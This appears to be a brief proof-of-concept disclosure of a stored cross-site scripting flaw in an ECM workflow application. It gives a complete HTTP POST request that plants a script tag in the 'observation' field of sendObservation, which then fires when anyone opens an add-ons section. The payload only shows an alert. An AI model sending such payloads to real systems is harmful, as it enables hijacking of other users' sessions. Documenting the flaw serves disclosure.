# xss-s-2

Send a POST to `/ecm/api/rest/ecm/workflowView/sendObservation/` with payload and change `PROCESS_ID` at `processInstanceId` (parameter vulnerable) with ID of your document. To run the stored xss simply navigate to any add-ons section of any solicitation and it will be triggered. 

```
POST /ecm/api/rest/ecm/workflowView/sendObservation/ HTTP/2
Host: host.com
Cookie: JSESSIONID=session; JSESSIONIDSSO=sessionSSO
Content-Type: application/json
Content-Length: 152

{"processInstanceId":PROCESS_ID,"stateSequence":9,"movementSequence":2,"observation":"<p><script>alert(document.domain)</script></p>\n","managerMode":false}
```
